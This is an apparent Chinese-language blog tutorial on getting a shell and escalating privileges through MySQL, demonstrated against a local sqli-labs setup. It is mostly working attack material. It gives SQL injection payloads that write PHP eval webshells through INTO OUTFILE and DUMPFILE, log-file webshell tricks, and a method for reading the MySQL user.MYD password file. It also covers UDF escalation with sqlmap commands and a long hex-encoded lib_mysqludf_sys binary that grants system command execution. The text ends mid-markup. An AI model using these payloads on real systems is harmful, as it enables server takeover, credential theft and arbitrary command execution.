写shell</h3><p>假设已经获取了web目录为：”D:\phpstudy_pro\WWW&quot;</p><p>使用以下语句将一句话木马写入到web根目录下的 aaa.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">union select <span class="number">1</span>,<span class="string">&quot;&lt;?php eval(<span class="subst">$_GET</span>[&#x27;a&#x27;])?&gt;&quot;</span>  ,<span class="number">3</span> into outfile <span class="string">&quot;D:\\phpstudy_pro\\WWW\\aaa.php&quot;</span> </span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs/Less-1/?id=-1%27  union select 1,&quot;<span class="meta">&lt;?php</span> eval($_GET[&#x27;a&#x27;])<span class="meta">?&gt;</span>&quot;  ,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\aaa.php&quot; --+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumpfile 写shell</span><br><span class="line">union select <span class="number">1</span>,<span class="string">&quot;&lt;?php eval(<span class="subst">$_GET</span>[&#x27;a&#x27;])?&gt;&quot;</span>  ,<span class="number">3</span> into dumpfile <span class="string">&quot;D:\\phpstudy_pro\\WWW\\aaab.php&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs/Less-1/?id=-1%27  union select 1,&quot;<span class="meta">&lt;?php</span> eval($_GET[&#x27;a&#x27;])<span class="meta">?&gt;</span>&quot;  ,3 into dumpfile &quot;D:\\phpstudy_pro\\WWW\\aaab.php&quot; --+</span></span><br></pre></td></tr></table></figure><h4 id="5-1-into-file-十六进制写shell"><a href="#5-1-into-file-十六进制写shell" class="headerlink" title="5.1  into file 十六进制写shell"></a>5.1  into file 十六进制写shell</h4><p>在日常渗透中，可能会遇到关键字被过滤或者单引号被转义等情况，导致一句话木马写入失败，此时根据mysql可以解析十六进制的特性，我们可以将一句话木马十六进制编码后绕过限制达到getshell的目的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1%27 union select 1,0x3c3f70687020406576616c28245f504f53545b77686f616d695d293b3f3e,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\aaab.php&quot;--+</span><br><span class="line"></span><br><span class="line">其中0x3c3f70687020406576616c28245f504f53545b77686f616d695d293b3f3e 的值为 &lt;?php @eval($_POST[whoami]);?&gt;</span><br></pre></td></tr></table></figure><h4 id="5-2-非联合查询法下的写入WebShell"><a href="#5-2-非联合查询法下的写入WebShell" class="headerlink" title="5.2 非联合查询法下的写入WebShell"></a>5.2 非联合查询法下的写入WebShell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1 into outfile &#x27;物理路径&#x27; lines terminated by  (一句话hex编码)#</span><br><span class="line">?id=1 into outfile &#x27;物理路径&#x27; fields terminated by (一句话hex编码)#</span><br><span class="line">?id=1 into outfile &#x27;物理路径&#x27; columns terminated by (一句话hex编码)#</span><br><span class="line">?id=1 into outfile &#x27;物理路径&#x27; lines starting by (一句话hex编码)#</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=1 into outfile &quot;D:\\phpstudy_pro\\WWW\\aaab.php&quot;  lines terminated by 0x3c3f70687020406576616c28245f504f53545b77686f616d695d293b3f3e--+ </span><br></pre></td></tr></table></figure><h2 id="0x1-利用日志getshell"><a href="#0x1-利用日志getshell" class="headerlink" title="0x1 利用日志getshell"></a>0x1 利用日志getshell</h2><p>​    mysql的日志存储位置是一个可控变量，我们通过自定义日志存储位置并将一句话木马写入到日志文件中，从而实现getshell的目的,该方式需要能够利用set对日志路径进行设置！可以通过phpmyadmin等界面进行</p><h3 id="查看-日志开启情况"><a href="#查看-日志开启情况" class="headerlink" title="查看 日志开启情况"></a>查看 日志开启情况</h3><p>在mysql中我们通过查询语句  show variables like “%general%”; 可以查看日志的开启情况。</p><p><img src="image-20210825201519525.png" alt="image-20210825201519525"></p><p>其中general_log_file 即为我们mysql日志存储的位置</p><p>在堆叠查询下可以直接操纵sql语句改变general_log_file位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-38/?id=-1&#x27;; set global general_log_file=&quot;D:\\phpstudy_pro\\WWW\\1234.php&quot; --+</span><br></pre></td></tr></table></figure><p>在phpmyadmin中可以使用sql语句执行日志写入shell 。</p><ol><li><p>设置general_log 的值为 On</p><p>set  global general_log = on<br><img src="image-20210825214042940.png" alt="image-20210825214042940"></p></li></ol><p>2.设置日志路径为  “D:\phpstudy_pro\WWW\123.php”，路径可通过上面的爆路径方式获取。</p><p>3.在网页执行代码 select “<?php phpinfo();?>“; </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1 union select 1, &quot;&lt;?php phpinfo();?&gt;&quot; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 123.php文件中发现phpinfo代码，可直接访问该文件获取phpinfo界面！</p><p><img src="image-20210825214341237.png" alt="image-20210825214341237"></p><p><img src="image-20210825214457210.png" alt="image-20210825214457210"></p><p><font color="red">日志getshell不受secure_file_priv影响！</font></p><h2 id="0x2-慢查询getshell"><a href="#0x2-慢查询getshell" class="headerlink" title="0x2 慢查询getshell"></a>0x2 慢查询getshell</h2><p>什么是慢查询：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">慢查询日志 MySQL的慢查询日志是MySQL提供的一种日志记录，它用来记录在MySQL中响应时间超过阀值的语句，具体指运行时间超过long_query_time值的SQL，则会被记录到慢查询日志中。具体指运行时间超过long_query_time值的SQL，则会被记录到慢查询日志中。long_query_time的默认值为10，意思是运行10秒以上的语句。</span><br></pre></td></tr></table></figure><p>慢查询日志getshell和上面的日志getshell方式类似，下面开始试验！</p><p>1.查询当前慢查询日志是否开启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%slow%&quot;;</span><br></pre></td></tr></table></figure><p><img src="image-20210826090908199.png" alt="image-20210826090908199"></p><p>slow_query_log 为on是表示慢日志查询功能</p><p>slow_query_log_file 的值可以被用户设置为任意值</p><p>2.开启slow_query_log 为on  ,并将slow_query_log_file=”D:\phpstudy_pro\WWW\123.php”</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global  slow_query_log=on</span><br><span class="line">set global slow_query_log_file=&quot;D:\\phpstudy_pro\\WWW\\123.php&quot;;</span><br></pre></td></tr></table></figure><p>修改后结果如下：</p><p><img src="image-20210826091626726.png" alt="image-20210826091626726"></p><ol start="3"><li><p>查看慢查询设置时间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;long_query_time&quot;;</span><br></pre></td></tr></table></figure><p><img src="image-20210826093317024.png" alt="image-20210826093317024"></p></li></ol><p>这里表示超过10秒的响应时间的访问链接会被记录到慢查询记录中</p><p>4.通过sleep() 加长响应时间，以达到慢查询的要求！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">常用语句</span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27; from mysql.db where sleep(10);</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=&#x27; union select  1,2,&#x27;&lt;?php phpinfo();?&gt;&#x27; from mysql.db where sleep(10) --+</span><br></pre></td></tr></table></figure><p>当执行语句后在123.php中发现phpinfo语句，证明实验成功！</p><p><img src="image-20210826095221761.png" alt="image-20210826095221761"></p><h2 id="0x3-创建表，导出数据"><a href="#0x3-创建表，导出数据" class="headerlink" title="0x3 创建表，导出数据"></a>0x3 创建表，导出数据</h2><p>原理和 into outfile一致，下面直接操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use test;</span><br><span class="line">drop table if exists vow;</span><br><span class="line">create table vow(name text not null);</span><br><span class="line">insert into vow(name) values(&#x27;&lt;?php phpinfo(); ?&gt;&#x27;);</span><br><span class="line">select name from vow into outfile &#x27;D:\\phpstudy_pro\\WWW\\123456.php&#x27;;</span><br><span class="line">drop tables vow;</span><br></pre></td></tr></table></figure><p>该方法受到secure-file-priv 配置的影响，需要该选项为 空</p><p><img src="image-20210826100521431.png" alt="image-20210826100521431"></p><p>执行完就可以访问shell文件了！</p><h2 id="0x4-普通权限拿root密码"><a href="#0x4-普通权限拿root密码" class="headerlink" title="0x4 普通权限拿root密码"></a>0x4 普通权限拿root密码</h2><p>如果一个注入点只是一个普通权限，并且没有办法写shell，那么可以尝试利用以下方法。</p><p>利用条件：</p><ol><li>知道一个数据库用户账密</li><li>能进入到 phpmyadmin 下</li><li>一些默认文件路径位置没有更改</li></ol><p>使用 show variables like “general”; 命令查看当前的log日志路径，根据该路径推算出默认的user.MYD路径，一般默认的位置都是在 Mysql\data\mysql\user.MYD 这个路径下。</p><p><img src="image-20210826101303571.png" alt="image-20210826101303571"></p><p>2.使用load data 将这个存有用户密码的配置文件导入到另外一个表中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD DATA LOCAL INFILE &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\mysql\\user.MYD&quot; INTO TABLE tests FIELDS TERMINATED BY ‘’;</span><br></pre></td></tr></table></figure><p><img src="image-20210826161918383.png" alt="image-20210826161918383"></p><h1 id="MYSQL提权"><a href="#MYSQL提权" class="headerlink" title="MYSQL提权"></a>MYSQL提权</h1><p>MYSQL提权即我们可以通过mysql执行系统命令，执行系统命令的权限取决于数据库启动用户的权限</p><h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><h3 id="什么是UDF"><a href="#什么是UDF" class="headerlink" title="什么是UDF"></a>什么是UDF</h3><p>UDF是MySQL的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。用户可以通过添加新函数的方式对mysql的功能进行扩充，类似于mysql自带的concat()等函数，这种使用者自行添加的MySQL函数就称为UDF(User Define Function)。</p><p>当我们有了数据库读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库root权限提升到系统的管理员权限。</p><h3 id="UDF提权的原理"><a href="#UDF提权的原理" class="headerlink" title="UDF提权的原理"></a>UDF提权的原理</h3><p>假设我们自定义的udf文件为udf.dll,并将其存放到mysql插件目录下，不同的版本可能插件目录不同，在利用环境中介绍。在udf文件中我们定义了sys_eval的mysql函数，该函数可以执行任意的系统命令，但是当我们打开mysql命令行时会发现提示该函数未定义，也就是说我们仅仅是把udf.dll放在了插件目录下，但是还没有引用该函数，所以需要先导入该dll文件后才能正常的使用并执行系统命令。</p><p>导入dll自定义函数的语句</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION 自定义函数名 RETURNS STRING SONAME DLL文件名</span><br><span class="line">实例：</span><br><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure><p>这样我们就可以使用sys_eval()函数了。</p><p>UDF提权原理：UDF提权是利用了用户自定义的DLL动态链接库（.dll或.so），通过在dll中定义恶意的函数，达到执行系统命令的效果！</p><p>适用环境:windows以及linux环境</p><p>利用条件：</p><p>1.具有写权限以及插件目录可写或者可以更改插件目录</p><p>2.mysql 版本大于5.1时且为windows系统，UDF文件在mysql安装目录下的lib/plugin文件夹下，该文件夹默认存在</p><p>该路径可以通过 命令查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="image-20210826171903313.png" alt="image-20210826171903313"></p><p>3.mysql 版本小于5.1时 ，DLL文件在windows server 2003必须放在<code>c:\windows\system32</code> 目录，在 <code>Windows Server 2000</code> 下放置在 <code>c:\winnt\system32</code> 目录中，可以用<code>INTO DUMPFILE</code> 写入，但一般会有 <code>secure_file_priv</code> 的限制，还不如直接用 <code>webshell</code> 传到 <code>plugin</code> 目录下。</p><h3 id="获取恶意DLL"><a href="#获取恶意DLL" class="headerlink" title="获取恶意DLL"></a>获取恶意DLL</h3><p>在sqlmap以及msf中都内置的有恶意DLL文件，但是sqlmap的dll文件经过了加密，可以使用目录 sqlmap根目录/extra/cloak/cloak.py对文件进行解密！sqlmap的dll文件位置在 <strong>sqlmap根目录\data\udf\mysql</strong> 下，需要根据目标系统的位数进行选择不同的dll文件，这里以windows64位进行演示： 在cloak文件夹下执行以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">制作so文件</span></span><br><span class="line">python3 cloak.py -d -i ..\..\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_  -o lib_mysqludf_sys_64.so</span><br><span class="line">制作dll文件</span><br><span class="line">python3 cloak.py -d -i ..\..\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_  -o lib_mysqludf_sys_64.dll</span><br><span class="line"></span><br><span class="line">linux 32位dll制作</span><br><span class="line">python3 cloak.py -d -i ..\..\data\udf\mysql\linux\32\lib_mysqludf_sys.so_  -o lib_mysqludf_sys_linux_32.dll</span><br><span class="line">python3 cloak.py -d -i ..\..\data\udf\mysql\linux\32\lib_mysqludf_sys.so_  -o lib_mysqludf_sys_linux_32.so</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">linux 64位dll制作</span><br><span class="line">python3 cloak.py -d -i ..\..\data\udf\mysql\linux\64\lib_mysqludf_sys.so_  -o lib_mysqludf_sys_linux_64.so</span><br><span class="line">python3 cloak.py -d -i ..\..\data\udf\mysql\linux\64\lib_mysqludf_sys.so_  -o lib_mysqludf_sys_linux_64.dll</span><br></pre></td></tr></table></figure><p>windows 32位的dll文件会被火绒查杀！</p><h3 id="sqlmap写入恶意dll文件"><a href="#sqlmap写入恶意dll文件" class="headerlink" title="sqlmap写入恶意dll文件"></a>sqlmap写入恶意dll文件</h3><p>限制条件：</p><p>​    1.sql注入点要是高权限</p><p>​    2.plugins可写并且无secure_file_priv限制</p><p>​    3.POST注入点。  GET注入点有字节限制</p><p>以sqllibs第九关为例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 &quot;D:\python3\sqlmap\sqlmap.py&quot; -u &quot;http://127.0.0.1/sqli-labs/Less-11/&quot; --data=&quot;uname=admin*&amp;passwd=admin&amp;submit=Submit&quot; --file-write=&quot;D:\渗透工具集\渗透工具集\黑箱子\信息收集\提权\mysql提权\UDF提权\sqlmap\lib_mysqludf_sys_64.dll&quot; --file-dest=&quot;D:/phpstudy_pro/Extensions/MySQL5.7.26/lib/plugin/udf.so&quot; --batch                </span><br></pre></td></tr></table></figure><p>最终成功生成了udf.so文件</p><p><img src="image-20210827093553538.png" alt="image-20210827093553538"></p><h3 id="手工导入恶意DLL"><a href="#手工导入恶意DLL" class="headerlink" title="手工导入恶意DLL"></a>手工导入恶意DLL</h3><p>利用条件：</p><ol><li>secure_file_priv 为空</li><li>可以操纵原生的sql语句</li></ol><h4 id="1-直接导入"><a href="#1-直接导入" class="headerlink" title="1.直接导入"></a>1.直接导入</h4><p>利用load_file 直接将dll文件导入到mysql的lib/plugins文件夹下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;C:\\Users\\Administrator\\Desktop\\lib_mysqludf_sys_64.dll&quot;) into dumpfile &quot;D:/phpstudy_pro/Extensions/MySQL5.7.26/lib/plugin/testss.dll&quot;</span><br></pre></td></tr></table></figure><p>这样恶意dll文件就被成功导入了，同时也可以先将dll文件十六进制编码后，然后在进行导入</p><h4 id="2-生成16进制DLL文本"><a href="#2-生成16进制DLL文本" class="headerlink" title="2.生成16进制DLL文本"></a>2.生成16进制DLL文本</h4><p>使用  mysql原生语句生成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT hex(load_file(&quot;C:/Users/Administrator/Desktop/lib_mysqludf_sys_64.dll&quot;)) into dumpfile &#x27;C:/Users/Administrator/Desktop/udfssss.txt&#x27;</span><br></pre></td></tr></table></figure><p>导入导出路径不能有中文，否则文件是空的！</p><p>常见的dll导出语句，0x部分为dll 十六进制后的代码</p><h5 id="windows-x64-导入语句"><a href="#windows-x64-导入语句" class="headerlink" title="windows x64  导入语句"></a>windows x64  导入语句</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select 0xinto DUMPFILE &quot;D:/phpstudy_pro/Extensions/MySQL5.7.26/lib/plugin/test.dll&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">so文件</span><br><span class="line"></span><br><span class="line">SELECT  INTO DUMPFILE &#x27;D:/phpstudy_pro/Extensions/MySQL5.7.26/lib/plugin/test.dll&#x27;;</span><br></pre></td></tr></table></figure><h5 id="windows-x32-导入语句"><a href="#windows-x32-导入语句" class="headerlink" title="windows x32 导入语句"></a>windows x32 导入语句</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT  INTO DUMPFILE &#x27;D:/phpstudy_pro/Extensions/MySQL5.7.26/lib/plugin/test.dll&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">so文件</span><br><span class="line"></span><br><span class="line">SELECT 0x7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c3260300008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666fffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b0000001000000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000 INTO DUMPFILE &#x27;D:/phpstudy_pro/Extensions/MySQL5.7.26/lib/plugin/test.dll&#x27;;</span><br></pre></td></tr></table></figure><h4 id="3-分段写入数据表中，然后-select-那个字段"><a href="#3-分段写入数据表中，然后-select-那个字段" class="headerlink" title="3.分段写入数据表中，然后 select 那个字段"></a>3.分段写入数据表中，然后 select 那个字段</h4><p>未成功实验</p><figure class="highlight plaintext"><table><tr><td 